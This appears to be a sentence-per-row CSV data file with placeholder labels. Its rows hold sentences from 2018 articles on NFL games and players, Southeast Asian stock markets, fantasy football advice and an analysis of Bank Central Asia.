"The pass-interference call on Joe Haden in the end zone, where the Steelers corner barely rubbed elbows with Alvin Kamara, was one of the worst weve seen all year without adding context to it.",-1,0
"When you throw in the fact that it was on a fourth-and-1 from the Steelers 34, gave the Saints 33 yards and the game was decided by three points?",-1,0
"A total abomination, and one made worse by the fact that Craig Wroldstads crew threw another shaky PI flag on Haden on a fourth down during New Orleans game-winning drive.",-1,0
"And heres where Id advocate, again, for making the big-box penaltiespersonal fouls, pass interference, etc.reviewable.",-1,0
"They have too big an impact on the game not to give yourself the chance to clean up mistakes.",-1,0
"2.",-1,0
"Yes, new Vikings coordinator Kevin Stefanski has cut down the volume in the offense, and thats helped guys play faster.",-1,0
"But more than that, as the Vikings players have seen it, hes leaned on elements he knew made the offense successful under Pat Shurmur in 2017.",-1,0
"Two pieces of evidence?",-1,0
"One, Stefanski will repeat run calls that are working more often.",-1,0
"And two, hes weaponizing tempo by mixing the pace of the offense in-game.",-1,0
"3.",-1,0
"The Seahawks win over the Chiefs on Sunday was pretty fitting, in that it exemplified what Seattles program is all about, on a night when the franchise clinched its return to the postseason.",-1,0
"On offense, Seattle ran for 210 yards.",-1,0
"On defense, the Seahawks only sacked Patrick Mahomes once but registered 11 additional hits on the K.C.",-1,0
"quarterback.",-1,0
"The old formula is back, and that brings me to a bunch of conversations Ive had with Pete Carroll about his teams 2018 retooling.",-1,0
"This offseason, to him, was about the Seahawks again being true to who theyve been over the last eight years, which meant a lot of competition in camp for open spotsIt feels like four or five years ago, he told me.",-1,0
"It feels fresh and wide open.",-1,0
"And with a very different cast of characters, the results on the field, stylistically, have looked similar too.",-1,0
"4.",-1,0
"The Chiefs points allowed since Week 11: 54, 33, 24, 29, 38.",-1,0
"And of the offenses theyve played in that five-game stretch, only one (the Rams) ranks in the top quarter of the league.",-1,0
"At this point, particularly with Sammy Watkins down, Kareem Hunt gone and Tyreek Hill nicked up, Kansas City is going to need Patrick Mahomes to walk on water in the playoffs.",-1,0
"5.",-1,0
"Good news and bad news for the Patriots offense in its first game ost-Josh Gordon.",-1,0
"Good news: New England rang up a whopping 273 yards on 47 carries, and Sony Michel (18 carries, 116 yards) looked every bit the bell cow in how he ran through contact in the 24-12 win over the Bills.",-1,0
"Bad news: Tom Bradys 48.3 passer rating was the worst hes ever posted in a win, and potential Gordon replacements Corddarelle Patterson, Chris Hogan and Phillip Dorsett combined for one catch for three yards.",-1,0
"The Patriots have work to do.",-1,0
"6.",-1,0
"Browns QB Baker Mayfield finished up another win with another spectacular stat linehe was 27 of 37 for 284 yards and three touchdowns against the Bengals.",-1,0
"But what the coaches liked most about this one was how unspectacular the performance really was.",-1,0
"As one Cleveland staffer explained to me, Mayfield is going from playing football to playing quarterback, which is a process for most young guys coming into the league in this day and age.",-1,0
"7.",-1,0
"Two things I love about the Bears.",-1,0
"First, the ClubDub celebrations postgame are awesome, and a part of coach Matt Nagys ongoing commitment to make players excited to come to work on a day-to-day basis.",-1,0
"And I know the players are seeing that not just on Sunday, but Monday through Saturday as well.",-1,0
"Second, Nagy is showing faith in those guys in his aggressivenessand in particular on the fourth-and-1 he went for from his own 35, up 14-9 with 4:10 left.",-1,0
"The Bears picked up the first down with a Mitch Trubsiky sneak.",-1,0
"Allen Robinson fumbled the ball away six plays later, but that doesnt change my outlook on these kinds of calls.",-1,0
"As Zach Ertz said earlier in the column, those kinds of decisions can be massive for a players confidence.",-1,0
"8.",-1,0
"Hats off to C.J.",-1,0
"Anderson, who stayed ready and prepared like a pro after joining the Rams this week, showing up early to the facility and working with his new coaches to get up to speed.",-1,0
"It paid off for Anderson in a 20-carry, 167-yard effort, and for the Rams in the chance they took on him.",-1,0
"9.",-1,0
"As I said earlier, I dont know if Mike Tannenbaum will be making the decisions in Miami next year, but the Dolphins have certainly been acting as if theyll be looking at replacing Ryan Tannehill in 2019, in live-scouting the top college quarterbacks.",-1,0
"Tannehill turns 31 this summer and doesnt have a dime guaranteed left on his contract.",-1,0
"10.",-1,0
"Itll be interesting to see the staff changes Matt Patricia makes after a rough first year in Detroit.",-1,0
"I think offensive coordinator Jim Bob Cooters a good coach, but his name is the first you hear out there when this subject comes up.",-1,0
"And Patricia has quarterbacks coach/ex-Patriots assistant George Godsey on staff, as a potential replacement.",-1,0
"We get our final weekday NFL game of the season tonight, and its a doozythe 6-8 Broncos travel to face the 3-11 Raiders.",-1,0
"The intrigue here?",-1,0
"This is potentially the final NFL game Oakland will ever host, so the fourth quarter could be quite a scene.",-1,0
"Other than that  
PICK: Denver 26, Oakland 20.",-1,0
"Merry Christmas everyone, and well see you in a few for an abbreviated Monday Afternoon Quarterback.",-1,0
"Question or comment?",-1,0
"Email us at talkback@themmqb.com.",-1,0
"Josh Doctson will end 2018 with more catches than he had in 2017 and he needs just three more yards in the Redskins' season finale to surpass last year's total in that category, too.",-1,0
"However, when you look at the numbers 42 grabs this season to go along with 499 receiving yards you realize the growth from the 2016 first-rounder is much more marginal than major.",-1,0
"On Sunday, one day after his team's difficult Week 16 loss vs. the Titans, Jay Gruden was asked to assess Doctson's campaign.",-1,0
"At first, he focused on the positives.",-1,0
""I think he's shown some improvement, yes," Gruden said.",-1,0
""I think he's fought through some injuries here the last couple of weeks...",-1,0
"I really appreciate him fighting through the pain and trying to make some plays.",-1,0
"I think he's shown more physicality at the receiver position, both in the running game and the passing game."",-1,0
"For someone whose rookie year was ruined by a mysterious Achilles injury, Doctson's durability has been a lot better since then.",-1,0
"He played every game in 2017, has missed just one in 2018 and, like his coach explained, has persevered through a few issues to continue to take the field for the 7-8 'Skins.",-1,0
"Toughness questions surrounded No.",-1,0
"18 early on, but those are largely gone now.",-1,0
"Yet as Gruden worked through his answer, he touched on something else that has consistently followed the receiver throughout his career.",-1,0
""I still would like to get him more opportunities to make some plays on the ball down the field, and we've just got to continue to try and press that issue with our quarterbacks," Gruden said.",-1,0
""Having played three, four quarterbacks, sometimes it's hard for them to trust the fact that this guy does have a 42-inch vertical and you've got to get him some 50/50 opportunities."",-1,0
"The desire to get Doctson more opportunities, more chances on jump balls and more looks down the field is something Gruden brings up all the time.",-1,0
"It's something that Kirk Cousins touched on when he was here, too, and you heard Alex Smith mention it while he was healthy.",-1,0
"Unfortunately, that desire has yet to translate to a week-in, week-out rhythm between the 26-year-old, his coach and his passers during his almost three-year tenure with Washington.",-1,0
"He's never topped 90 yards in a game and his career high for grabs in a single contest is six, a figure he's reached just once.",-1,0
"As a sophomore in the NFL, he did haul in six touchdowns and orchestrated some very acrobatic highlights, using that vertical that Gruden is fond of.",-1,0
"But he's only reached the end zone twice this season, his yards-per-catch is down almost 2.5 yards and he hasn't created as many dynamic, athletic snags.",-1,0
"Overall, in 32 appearances, he's compiled 79 catches for 1,067 yards and 8 TDs.",-1,0
"Those are numbers he and the organization would like him to get to in one season, not over the course of three.",-1,0
"Of course, the lack of progression doesn't fall 100-percent on Doctson.",-1,0
"The unbelievable rash of injuries to the Redskins' QBs has no doubt affected every WR's statline.",-1,0
"Gruden, meanwhile, regrets not getting him more involved.",-1,0
"With all that being said, he too often disappears for long stretches, doesn't separate enough from DBs and has, so far, looked more like a decent third wideout as opposed to a strong No.",-1,0
"1 worth the 22nd overall pick the franchise invested in him.",-1,0
"So, all parties involved are about to enter the offseason again wondering how to fully unlock Doctson's talents.",-1,0
"Everyone needs to be better come next September, or else 2019 could very well be his last in D.C.
"I think he can do a lot more, but I think the quarterbacks can give him a lot more looks," Gruden said.",-1,0
""Hopefully in the future that will happen."",-1,0
"MORE REDSKINS NEWS",-1,0
"Josh Doctson will end 2018 with more catches than he had in 2017 and he needs just three more yards in the Redskins' season finale to surpass last year's total in that category, too.",-1,0
"However, when you look at the numbers 42 grabs this season to go along with 499 receiving yards you realize the growth from the 2016 first-rounder is much more marginal than major.",-1,0
"On Sunday, one day after his team's difficult Week 16 loss vs. the Titans, Jay Gruden was asked to assess Doctson's campaign.",-1,0
"At first, he focused on the positives.",-1,0
""I think he's shown some improvement, yes," Gruden said.",-1,0
""I think he's fought through some injuries here the last couple of weeks...",-1,0
"I really appreciate him fighting through the pain and trying to make some plays.",-1,0
"I think he's shown more physicality at the receiver position, both in the running game and the passing game."",-1,0
"For someone whose rookie year was ruined by a mysterious Achilles injury, Doctson's durability has been a lot better since then.",-1,0
"He played every game in 2017, has missed just one in 2018 and, like his coach explained, has persevered through a few issues to continue to take the field for the 7-8 'Skins.",-1,0
"Toughness questions surrounded No.",-1,0
"18 early on, but those are largely gone now.",-1,0
"Yet as Gruden worked through his answer, he touched on something else that has consistently followed the receiver throughout his career.",-1,0
""I still would like to get him more opportunities to make some plays on the ball down the field, and we've just got to continue to try and press that issue with our quarterbacks," Gruden said.",-1,0
""Having played three, four quarterbacks, sometimes it's hard for them to trust the fact that this guy does have a 42-inch vertical and you've got to get him some 50/50 opportunities."",-1,0
"The desire to get Doctson more opportunities, more chances on jump balls and more looks down the field is something Gruden brings up all the time.",-1,0
"It's something that Kirk Cousins touched on when he was here, too, and you heard Alex Smith mention it while he was healthy.",-1,0
"Unfortunately, that desire has yet to translate to a week-in, week-out rhythm between the 26-year-old, his coach and his passers during his almost three-year tenure with Washington.",-1,0
"He's never topped 90 yards in a game and his career high for grabs in a single contest is six, a figure he's reached just once.",-1,0
"As a sophomore in the NFL, he did haul in six touchdowns and orchestrated some very acrobatic highlights, using that vertical that Gruden is fond of.",-1,0
"But he's only reached the end zone twice this season, his yards-per-catch is down almost 2.5 yards and he hasn't created as many dynamic, athletic snags.",-1,0
"Overall, in 32 appearances, he's compiled 79 catches for 1,067 yards and 8 TDs.",-1,0
"Those are numbers he and the organization would like him to get to in one season, not over the course of three.",-1,0
"Of course, the lack of progression doesn't fall 100-percent on Doctson.",-1,0
"The unbelievable rash of injuries to the Redskins' QBs has no doubt affected every WR's statline.",-1,0
"Gruden, meanwhile, regrets not getting him more involved.",-1,0
"With all that being said, he too often disappears for long stretches, doesn't separate enough from DBs and has, so far, looked more like a decent third wideout as opposed to a strong No.",-1,0
"1 worth the 22nd overall pick the franchise invested in him.",-1,0
"So, all parties involved are about to enter the offseason again wondering how to fully unlock Doctson's talents.",-1,0
"Everyone needs to be better come next September, or else 2019 could very well be his last in D.C.
"I think he can do a lot more, but I think the quarterbacks can give him a lot more looks," Gruden said.",-1,0
""Hopefully in the future that will happen."",-1,0
"MORE REDSKINS NEWS",-1,0
"A man walks in the business area in Bangkok, May 22, 2015.",-1,0
"(Reuters file photo)
Most Southeast Asian stock markets, including the Stock Exchange of Thailand, remained subdued on Monday as political uncertainty in the United States continued to dampen investors' risk appetite.",-1,0
"A cautious mood pervaded in broader Asia as market participants evaluated a government shutdown in the world's largest economy, as well as rumours of a change in its central bank head.",-1,0
"Local trading volumes were also low in light of the holiday season.",-1,0
"Thailand's index was largely flat, as shares of oil and gas explorer PTT Plc - which fell as much as 1.1% - declined in tandem with oil prices, while infrastructure developer Bangkok Expressway and Metro Plc's stock supported the index by gaining as much as 4.6%.",-1,0
"The Singapore benchmark index was also largely flat, as mild gains in financial stocks were offset by declines in industrial and consumer stocks.",-1,0
"The index was set for its third straight session of losses.",-1,0
"Singapore Telecommunications' stock ranked among the largest intraday losers on the index, while that of banking heavyweight DBS Group rose about 0.5%.",-1,0
"The island state's bourse was slated to close early ahead of Christmas.",-1,0
"Trading volumes stood at a fraction of their 30-day average.",-1,0
"Meanwhile, indexes of Vietnam and Malaysia rose marginally, while Philippine and Indonesian markets were closed until Wednesday.",-1,0
"With rosters of all shapes and sizes, IDP advice can be a bit tricky, so the purpose of this article is to point out players whose value is elevated for the upcoming week.",-1,0
"Some of these players will be superstars while others will be players found on many waiver wires.",-1,0
"Whether youre streaming IDPs each week or have a stocked roster, this one size fits all approach will hopefully help most everyone find a weekly edge.",-1,0
"Linebackers
Kiko Alonso, Raekwon McMillan and Jerome Baker Dolphins: 
The clear way to attack the Dolphins on defense is through the consistent use of the running game.",-1,0
"Playing on their home field in the expected frigid climate of Buffalo, look for the Bills to consistently punish the Miami front-seven with not only the running backs but also Josh Allen.",-1,0
"Knowing the Bills have an excellent defense, theres a strong likelihood that the game script allows Buffalo to stay committed to the run for four quarters, making the Miami linebackers a strong play.",-1,0
"Antonio Morrison, Blake Martinez and Kyler FackrellPackers: Over the course of the season, the Packers have had a decent run defense.",-1,0
"However, with all the injuries theyve suffered along their defensive line, the Lions should be able to consistently attack Green Bay by running the football.",-1,0
"In addition, the Lions passing game has struggled for most of the season, so the coaching staff will likely close out their season by committing to their running backs, which makes it probable that the Packers linebackers will have a busy afternoon.",-1,0
"Darius Leonard, Matthew Adams and Anthony Walker (shoulder) Colts: The Colts have been a solid defensive squad throughout the season, but theyve been particularly stingy against the pass, which should make the offensive game planning quite simple for the Titans coaching staff.",-1,0
"Of course, we all know the Titans been committed to the run for quite some time, but in this divisional home contest, they need to win to make the playoffs, Derek Henry and Dion Lewis could easily combine for more than 30 carries, and the Colts linebackers should be up to the task, providing strong numbers for their fantasy owners.",-1,0
"Deone Bucannon, Gerald Hodges and Haason Reddick Cardinals: There are very few defenses as bad against the run than the Cardinals.",-1,0
"Theyll be at Seattle this week to face a team thats among the most committed to running the football in the entire league, and in this perfect match up, the Seahawks could easily run the ball more than ever.",-1,0
"There have been games this season that Russell Wilson hasnt needed to throw the ball 20 times, and against a clearly inferior opponent, this could be the case again.",-1,0
"This is a great week to utilize the Arizona linebackers.",-1,0
"Defensive backs
James Bradberry, Donte Jackson, Captain Munnerlyn and Mike Adams Panthers:
Simply stated, the Panthers are clearly a pass funnel defensive unit, and, playing on their home field, the Saints can be expected to attack this weak secondary early and often.",-1,0
"Even if they run out to a lead, the easiest way for them to move the chains to shorten the game would be through their short passing attack.",-1,0
"In addition, look for the Saints to utilize their running backs as frequently as receivers, and with their ability to make big plays, the Carolina defensive backs should have an extremely busy day.",-1,0
"Darius Slay, Nevin Lawson, DeShawn Shead and Glover Quin Lions: Over the second half of the season, the Lions have been a stout run defense, and although Jamaal Williams is a solid running back, its unlikely that hell be able to consistently move the chains in this contest.",-1,0
"Of course, the Packers have little trouble turning to Aaron Rodgers when the run game sputters, and on their home field, this is looking like the type of contest in which Green Bay will be happy to call plenty of passing plays against Detroits suspect secondary.",-1,0
"Look for the Lions DBs to post solid tackle totals in the season finale.",-1,0
"Steven Nelson, Kendall Fuller (wrist), Orlando Scandrick and Ron Parker Chiefs: Playing at Arrowhead Stadium, its difficult to imagine that the Raiders wont quickly fall behind on the scoreboard.",-1,0
"As a result, theyre all but certain to have to abandon their rushing attack, which should lead to Derek Carr being in position to throw nearly 40 passes as they try to stun their division rivals.",-1,0
"This is looking like a fantastic spot for the Kansas City defensive backs to not only pile up some tackles, but possibly nab a takeaway or two.",-1,0
"Desmond Trufant, Robert Alford, Brian Poole and Damontae Kazee Falcons: After a tumultuous season, Jameis Winston will have one last opportunity to show the Buccaneers management that he should be their quarterback of the future.",-1,0
"Although the Falcons have a solid pass rush on their home field, theyre not nearly the same unit when outside of the Georgia Dome.",-1,0
"Whenever he hasnt been pressured heavily this season, Winston has been quite effective, so look for him to throw the ball often, which should lead to plenty of production for the Atlanta defensive backs.",-1,0
"Pass rushers
Joey Bosa, Melvin Ingram, Darius Philon Chargers: 
Denver should come into this game trying to establish its presence on the ground, but its very likely that theyll fall behind on the scoreboard.",-1,0
"If thats the case, theyll have no choice other than to throw the football, and with a group of wide receivers that struggles to get separation against solid secondaries, this is the perfect spot for the Chargers pass rush to come up with a big performance, even though this game is on the road.",-1,0
"Cameron Jordan, Alex Okafor and Marcus Davenport Saints: Playing in New Orleans is no picnic for opponents who are unable to keep up with the potent Saints offensive attack, and thats likely what will happen to the Panthers.",-1,0
"Normally, that wouldnt be a problem for Cam Newton, but with him out for the season and Taylor Heinicke at QB, its unlikely hell be able to buy the type of time in the pocket that Newton typically did.",-1,0
"Even though Carolina likes to get the ball out of the quarterbacks hands quickly, the Saints defense should create enough confusion that the young signal caller holds the ball longer than hed like, and that should result in a big day for the New Orleans pass rush.",-1,0
"T.J. Watt, Vince Williams and Bud Dupree Steelers: About the only thing that the Bengals can count on these days is their rushing game with Joe Mixon, but unfortunately, thatll be the only thing the Steelers will have to worry about, so look for them to load the box to put Cincinnati in many unfavorable situations.",-1,0
"With Cincinnati having a poor group of wide receivers, Jeff Driskel will likely find himself with not nearly enough time in the pocket while waiting for his WRs to get open, which should allow the Pittsburgh pass rush to have a strong afternoon.",-1,0
"Justin Houston, Dee Ford and Chris Jones Chiefs: As mentioned earlier, the Kansas City defensive backs are recommended lineup options this week, but while Oakland is throwing the football, their offensive line is very likely going to have significant struggles to slow down the Chiefs pass rush.",-1,0
"Over the last month or so, this pass rush has been on a tear, and this is another excellent spot for them to finish the regular season on a high note.",-1,0
"Washington Redskins safety D.J.",-1,0
"Swearinger was released Monday after his latest critical comments about the teams coaching staff, some of which had previously been delivered during radio appearances.",-1,0
"So it was fitting that Swearinger broke the news of his release during an appearance with Grant Paulsen and Pete Medhurst on 106.7 The Fan, a station Swearinger appeared on weekly this fall.",-1,0
"The news came at the beginning of the previously scheduled interview, but Swearingers provocative comments didnt stop there.",-1,0
"What follows are some of the choicest sound bites Swearinger offered up during a 30-minute conversation.",-1,0
"On Coach Jay Gruden telling him he had been released: I asked him why; he didnt give me an explanation.",-1,0
"So I guess it was just because of the media .",-1,0
".",-1,0
".",-1,0
"The last conversation we had, never in a million years would I have thought Id be released .",-1,0
".",-1,0
".",-1,0
"I was just like, Oh wow, why?",-1,0
"And he didnt say anything.",-1,0
"I guess he didnt have an answer or respond; he just wanted to release me and that was that.",-1,0
"There wasnt no explanation on why.",-1,0
"He just said this is the third time Ive been in his office and were going to release you and that was that.",-1,0
"On whether he wasnt a fan of defensive coordinator Greg Manuskys play-calling: I wouldnt say that because in the past weve made plays in the things that hes called.",-1,0
"My only issue was a few tweaks here and there that could make us better and get guys making more plays on the ball.",-1,0
"That was my only issue.",-1,0
"It wasnt about the scheme or this or that.",-1,0
"There was just times that, from a players perspective, we could be better in certain situations.",-1,0
"Like I said, on third-and-seven, I would have zone eye so we could see the quarterback.",-1,0
"If Im wrong for that, then Ive got to deal with the consequences.",-1,0
"And the consequences are me being released, so Im fine with that.",-1,0
"Im fine with that and Im just ready to move forward with my journey in life.",-1,0
"On being released at financial cost to the team: I dont have words for this, man.",-1,0
"I had a Pro Bowl year.",-1,0
"I came here and had eight interceptions in two years.",-1,0
"I was a captain in year one.",-1,0
"This year, I thought I improved on everything.",-1,0
"And I get a slap in the face and get released, so you never know what could be said on top of whats going on.",-1,0
"But on my end, I knew I gave it my all and put my heart into it every single week trying to do the best I could to win games and get into the playoffs.",-1,0
"And I guess it says a lot about the organization.",-1,0
"[Redskins cut safety D.J.",-1,0
"Swearinger after critical comments about coaching staff]
On Gruden as a head coach: You know, Jay, hes a players' coach.",-1,0
"And that can go one of two ways.",-1,0
"It can go the players love him We want to play for you or it can go to a Man were not getting enough work.",-1,0
"And if we are doing the things that we do mediocre-wise or practicing light, then certain things like the playoffs are just not going to happen for certain.",-1,0
"On whether the Redskins need to work harder in practice: Man, Im not a Redskin anymore.",-1,0
"Like I said, Ive been on a team that has went to the playoffs, and [Ive been on a team that] went 3-13 and I know the formula that Bruce Arians had [with the Arizona Cardinals].",-1,0
"And it was a successful formula.",-1,0
"We practiced 10 times harder than we did here.",-1,0
"You know, its kind of crazy that every time a player that comes here from another team, theyre like Man, this is so laid-back.",-1,0
"But I guess thats just what type of practices we have: We have laid-back practices.",-1,0
"Every teammate of my old that comes here, they ask me Damn, bro, why is practice so laid-back, why are we just chillin out here?'",-1,0
"But I guess thats just the formula that this team has.",-1,0
"And it would be less of a man of me to stoop down to the mediocre when Im not a mediocre guy.",-1,0
"I dont like practicing mediocre, I dont like preparing mediocre.",-1,0
"And thats sort of the thing I guess that hurt me and got me released, but if thats the type of man that I am, to not accept mediocre, then I can live with that.",-1,0
"I can live with being released and live with wanting to win and be a winner.",-1,0
"I can live with it.",-1,0
"On Jonathan Allen tweeting his support for Manusky: I play defensive back, watch a lot of film.",-1,0
"When you play D line not taking anything from Allen, he plays D line, hes in his second year all they have to do is rush and get the quarterback or stop the run.",-1,0
"Its a different mind-set when you talk about a DB thats been in the game for a while and a D lineman that hasnt been in the game for a while.",-1,0
"The DBs and the linebackers, er play a lot of coverage; nine times out of 10, the D line, they rush so they may not know whats going on in the back end.",-1,0
"I guess hes a young player and he doesnt really know about calls in the back end and, you know, he said the right thing.",-1,0
"He said Greg Manusky called a good [game].",-1,0
"He had a great game, Jonathan Allen had a great game.",-1,0
"And why wouldnt he say that after he had a great game?",-1,0
"If he has a great game, then of course hes going to say [Manusky] called a good game.",-1,0
"But like I said, he doesnt play in the coverage, he doesnt play in the back, he never knows whats going on in the back end.",-1,0
"So for him to say that, hes taking up for his D coordinator, as he should.",-1,0
"But on my end, Im taking up for the players and the guys thats going out there to war with me.",-1,0
"On not being voted a captain this year: I was voted the captain from the players and I have proof and evidence of that, from some of my teammates, but thats another conversation elsewhere.",-1,0
"Everybody voted on the captains this year.",-1,0
"Offense and defense.",-1,0
"Last year only the defense voted for the defense and the offense voted for the offense .",-1,0
".",-1,0
".",-1,0
"I do know for a fact that I was named one of the captains and one of my teammates' votes did put me ahead of [a] three-way tie and it was the coachs decision to not name me the [defensive] captain.",-1,0
"This is the first team Ive been on where we only have three captains.",-1,0
"Everywhere else Ive been weve had four or five captains.",-1,0
"But this is the first year of my six-year career that we only have three captains.",-1,0
"So that was ironic, and you could read between those lines.",-1,0
"Its not rocket science on why I wasnt the captain.",-1,0
"Im a vocal guy, a passionate guy that wants to win, and if the coaches feel like Im too smart or Im a weapon as far as my smarts are concerned and to ignore what things are going wrong or not going well then they got to release the guy that has knowledge or has respect in the locker room, I guess.",-1,0
"On how receptive coaches were to feedback: My defensive backs coach, he understood everything.",-1,0
"I would always come to them, I would text them at times throughout the night while Im watching film till 1, 2 oclock in the morning.",-1,0
"Asking them, Hey Coach, what do you think about this coverage?",-1,0
"If we run this coverage well be able to stop the run, well be able to stop the pass.",-1,0
"Well be dominant if we run these certain coverages.",-1,0
"And its been times where Ive even broken down and even taught my coaches certain coverages that would be so successful, man, if you just run it and if everybody came on the same page.",-1,0
"Ive asked Coach Manusky, Ive sent him text messages 1, 2 oclock in the morning.",-1,0
"Hey Coach, can we run this? "",-1,0
"On his relationship with Manusky: Manusky even asked me, when Im done playing, he asked me do I want to coach.",-1,0
"You know, he wanted me to coach for him one day.",-1,0
"Two weeks ago.",-1,0
"Like I said, I send text messages all the time, whether Im watching the practice, whether Im watching the next film, whatever Im doing, Im just critiquing and Im showing my passion for the game.",-1,0
"Im studying the film.",-1,0
"I call myself a guru in the film room because Ive seen so much film and watched so much film.",-1,0
".",-1,0
".",-1,0
".",-1,0
"He was like, when Im done playing football, he wants me to come coach.",-1,0
"I still have the text messages.",-1,0
"I still have all of that.",-1,0
"But it is what it is, man, and I guess whatever happened, it happened for a reason.",-1,0
"On what helmet he would wear if he winds up in the Pro Bowl: I guess I gotta wear a South Carolina Gamecocks helmet, man.",-1,0
"On his turbulent NFL career: Ive grown a lot in these last six years.",-1,0
"Im peaceful in this moment right now, man.",-1,0
"Not like the last, I got released from Houston, I got released from Tampa and that wasnt so peaceful, but I am peaceful right now because I know I laid everything on the line and did it the right way.",-1,0
"I might rub some people the wrong way with some of the things that I said in the media, but at the end of the day, those things, theyre only gonna help us win.",-1,0
"If they want to win, something will change and something will happen, but if they dont want to win, then it is what it is.",-1,0
"On what he would do as a coach if a player called him out: I would go to the player, talk to the player, get him to understand that Okay, well we dont like this or like that, and if that doesnt work, well just tell the media hey, you cant interview this guy.",-1,0
"We dont want this guy interviewed.",-1,0
"Because thats something that Ive said, Ive said in the past, Hey coach, if you dont like the things that I said, hey man, just tell them to stop interviewing me, bro, because the only thing I know is 100 percent truth and being real.",-1,0
"So if you dont want me being interviewed, if you dont want these people hearing what I got to say, just tell these people to stop interviewing me and keep me away from the media.",-1,0
"And Ill be fine with just coming to work and ballin.",-1,0
"Read more on the Redskins:
4 big offseason questions facing the Redskins, including whats next at quarterback
The Redskins finally have a foundation on which to build.",-1,0
"Now they need a dose of star power.",-1,0
"Redskins eliminated from playoff contention for third straight year
Redskins show support for Josh Johnson after late interception ends comeback bid",-1,0
"Bank Central Asia (OTCPK:PBCRY) has long been one of the leading Indonesian Banks.",-1,0
"Its lower-than-peers cost of funds, and consequentially higher Net Interest Margin, along with its industry leading low NPL ratio is largely the reason for its outperformance on the local market this past year.",-1,0
"Whilst the majority of Indonesian banks saw their share prices decline throughout the year Bank Central Asia is up by around 20% this year.",-1,0
"Despite the bank clearly being of great quality some concerns arise over its current valuation.",-1,0
"This article therefore aims to analyse the strengths and weaknesses of this bank with the overall view of determining whether it could potentially be worth it for investors to dip their toes in the water on this stock at current levels.",-1,0
"Emerging Market Sentiment and Macro Conditions
Earlier this year when the Central Bank of Indonesia raised its benchmark interest rate it sent a message to the market that the central bank could raise rates further if the currency comes under strain.",-1,0
"This had some investors spooked as growth in South Asian nations, such as Indonesia, is driven largely by domestic demand as opposed to the export-oriented growth in North Asia.",-1,0
"Too rapidly rising interest rates therefore posed a risk of dampening consumer and business confidence and accordingly economic growth.",-1,0
"As the market increasingly expects the Fed to slow the pace of its rate hikes in 2019, investors saw the potential for rate hikes in Indonesia decline as well and re-entered the market in droves.",-1,0
"The recent remarks by Jerome Powel, the Chairman of the Federal Reserve, was considered by many not to be dovish enough.",-1,0
"If the Fed therefore continues to hike rates at the same pace as previously anticipated the Indonesian Central Bank may have to follow suit.",-1,0
"In this eventuality there is a risk of renewed sell-off in the Indonesian market.",-1,0
"This risk is particularly high in the Indonesian market where around 40% of all domestic bonds are owned by foreign investors.",-1,0
"The Impact of a Rate Hike, Asset Quality, and Capital
Such sell-off could affect all Indonesian stocks irrespective of the underlying fundamentals of the company.",-1,0
"This is therefore a risk investors should remain vigilant of even in the high-quality stocks such as Bank Central Asia.",-1,0
"From a fundamentals perspective, Bank Central Asia is amongst the Indonesian banks who will be impacted the least by a rate hike.",-1,0
"Although rising rates are generally considered to be positive for banks it is often the case only after crossing a certain threshold and does not hold true universally.",-1,0
"DBS expects that a 25-basis point rate hike would currently bring about a 5-basis point decline in the average NIM of the Indonesian Banking sector as their Cost of Funds, otherwise known as COF, increases.",-1,0
"The decline for Bank Central Asia will, however, be much lower given its industry leading CASA ratio.",-1,0
"DBS estimates that a 25-basis point rate hike would result in a 2.9-basis point increase in the banks COF and a 2.6-basis point decline in its NIM.",-1,0
"A decrease in NIM could never be considered a positive factor but this projected decline is clearly not catastrophic for a bank which currently enjoys a NIM of around 5.1%.",-1,0
"Bank Central Asia has also long maintained the lowest NPL ratio of the major Indonesian banks.",-1,0
"Its NPL ratio is currently at 1.4% and has been steadily improving since the Indonesian banks saw their NPLs peak in 2016.",-1,0
"The risk of the Indonesian credit cycle peaking is also therefore currently much lower than that of other nations.",-1,0
"(Source: Company Fillings)
Moodys has noted that throughout 2019 the formation rates of new nonperforming loans and restructured loans will likely remain far below their 2016 peaks.",-1,0
"It also expects loan growth to accelerate to around 10-12%.",-1,0
"This robust loan growth will certainly benefit Bank Central Asia although it may be lower if interest rates rise too rapidly.",-1,0
"The strong capital position of the Indonesian banking sector is also noteworthy.",-1,0
"Bank Central Asias Capital Adequacy Ratio at 23.2% is the highest of the major Indonesian banks and above the sector average of around 22%.",-1,0
"Its strong and continued internal capital generation along with this strong capital position makes the likelihood of the bank needing to resort to a dilutive capital raise seem highly unlikely.",-1,0
"Its strong capital position along with the banks industry leading funding mix and low Loan to Deposit ratio also positions it well to take advantage of any pickup in loan demand.",-1,0
"Earnings Outlook
Bank Central Asia reported a 17.3% YoY growth in loans outstanding in the third quarter of 2018 which was significantly higher than the banking sectors total loan growth of around 12.1%.",-1,0
